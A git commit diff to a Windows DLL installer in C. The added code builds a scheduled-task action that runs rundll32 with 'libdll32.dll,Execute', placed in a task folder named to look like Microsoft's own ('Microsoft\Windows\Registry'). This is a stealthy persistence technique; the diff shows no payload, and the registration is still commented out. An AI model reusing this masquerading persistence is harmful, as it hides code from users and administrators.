a276a641fa7033557e86ac2135c091e040655163
KHOPAN <93379212+KHOPAN@users.noreply.github.com>
2024-04-25 13:10:07 +0700

    Inline SetActions

--- DLL/Install.c
+++ DLL/Install.c
@@ -1,8 +1,9 @@
-//#include <string>
 #include "definition.h"
 
 #define TASK_FOLDER_NAME L"Microsoft\\Windows\\Registry"
 #define FILE_NAME L"libdll32.dll"
+#define FUNCTION_NAME L"Execute"
+#define RUNDLL32PATH L"System32\\rundll32.exe"
 
 EXPORT(Install) {
 	HRESULT result = CoInitializeEx(NULL, COINIT_MULTITHREADED);
@@ -111,16 +112,127 @@ EXPORT(Install) {
 	}
 
 	trigger->lpVtbl->Release(trigger);
-	//HI_SetTriggers(folder, definition);
-	/*std::wstring programArgument(FILE_NAME);
-	programArgument += L",Execute";
-	wchar_t* rundll32 = HU_GetSystemDirectory(L"rundll32.exe");
-	HI_SetActions(folder, definition, rundll32, programArgument.c_str());
-	HI_SetSettings(folder, definition);
+	UINT directoryLength = GetWindowsDirectoryW(NULL, 0);
+
+	if(!directoryLength) {
+		dialogError(GetLastError(), L"GetWindowsDirectoryW");
+		goto releasePrincipal;
+	}
+
+	wchar_t* windowsBuffer = malloc(directoryLength * sizeof(wchar_t));
+
+	if(!windowsBuffer) {
+		dialogError(ERROR_OUTOFMEMORY, L"malloc");
+		goto releasePrincipal;
+	}
+
+	directoryLength = GetWindowsDirectoryW(windowsBuffer, directoryLength);
+
+	if(!directoryLength) {
+		dialogError(GetLastError(), L"GetWindowsDirectoryW");
+		free(windowsBuffer);
+		goto releasePrincipal;
+	}
+
+	size_t fileNameLength = wcslen(RUNDLL32PATH);
+	int notEndWithBackslash = windowsBuffer[directoryLength - 1] != L'\\';
+	size_t rundll32PathBufferSize = directoryLength + fileNameLength + notEndWithBackslash + 1;
+	wchar_t* rundll32PathBuffer = malloc(rundll32PathBufferSize * sizeof(wchar_t));
+
+	if(!rundll32PathBuffer) {
+		dialogError(ERROR_OUTOFMEMORY, L"malloc");
+		free(windowsBuffer);
+		goto releasePrincipal;
+	}
+
+	for(size_t i = 0; i < directoryLength; i++) {
+		rundll32PathBuffer[i] = windowsBuffer[i];
+	}
+
+	free(windowsBuffer);
+
+	if(notEndWithBackslash) {
+		rundll32PathBuffer[directoryLength] = L'\\';
+	}
+
+	for(size_t i = 0; i < fileNameLength; i++) {
+		rundll32PathBuffer[i + directoryLength + notEndWithBackslash] = RUNDLL32PATH[i];
+	}
+
+	rundll32PathBuffer[rundll32PathBufferSize - 1] = 0;
+	fileNameLength = wcslen(FILE_NAME);
+	size_t functionNameLength = wcslen(FUNCTION_NAME);
+	size_t functionBufferSize = fileNameLength + 1 + functionNameLength + 1;
+	wchar_t* functionBuffer = malloc(functionBufferSize * sizeof(wchar_t));
+
+	if(!functionBuffer) {
+		dialogError(ERROR_OUTOFMEMORY, L"malloc");
+		goto freeRundll32PathBuffer;
+	}
+
+	for(size_t i = 0; i < fileNameLength; i++) {
+		functionBuffer[i] = FILE_NAME[i];
+	}
+	
+	functionBuffer[fileNameLength] = L',';
+
+	for(size_t i = 0; i < functionNameLength; i++) {
+		functionBuffer[i + fileNameLength + 1] = FUNCTION_NAME[i];
+	}
+
+	functionBuffer[functionBufferSize - 1] = 0;
+	IActionCollection* actionCollection = NULL;
+	result = taskDefinition->lpVtbl->get_Actions(taskDefinition, &actionCollection);
+
+	if(FAILED(result)) {
+		dialogError(result, L"ITaskDefinition::get_Actions");
+		goto freeFunctionBuffer;
+	}
+
+	IAction* action = NULL;
+	result = actionCollection->lpVtbl->Create(actionCollection, TASK_ACTION_EXEC, &action);
+	actionCollection->lpVtbl->Release(actionCollection);
+
+	if(FAILED(result)) {
+		dialogError(result, L"IActionCollection::Create");
+		goto freeFunctionBuffer;
+	}
+
+	IExecAction* executeAction = NULL;
+	result = action->lpVtbl->QueryInterface(action, &IID_IExecAction, &executeAction);
+	action->lpVtbl->Release(action);
+
+	if(FAILED(result)) {
+		dialogError(result, L"IAction::QueryInterface");
+		goto freeFunctionBuffer;
+	}
+
+	result = executeAction->lpVtbl->put_Path(executeAction, rundll32PathBuffer);
+
+	if(FAILED(result)) {
+		dialogError(result, L"IExecAction::put_Path");
+		executeAction->lpVtbl->Release(executeAction);
+		goto freeFunctionBuffer;
+	}
+
+	result = executeAction->lpVtbl->put_Arguments(executeAction, functionBuffer);
+	executeAction->lpVtbl->Release(executeAction);
+
+	if(FAILED(result)) {
+		dialogError(result, L"IExecAction::put_Arguments");
+		goto freeFunctionBuffer;
+	}
+
+	//HI_SetActions(folder, definition, rundll32, programArgument.c_str());
+	/*HI_SetSettings(folder, definition);
 	HI_RegisterTask(folder, definition, L"Startup");
 	definition->Release();
 	folder->Release();*/
 	MessageBoxW(NULL, L"Status: OK", L"Information", MB_OK | MB_DEFBUTTON1 | MB_ICONINFORMATION | MB_SYSTEMMODAL);
+freeFunctionBuffer:
+	free(functionBuffer);
+freeRundll32PathBuffer:
+	free(rundll32PathBuffer);
 releasePrincipal:
 	principal->lpVtbl->Release(principal);
 releaseTaskDefinition:
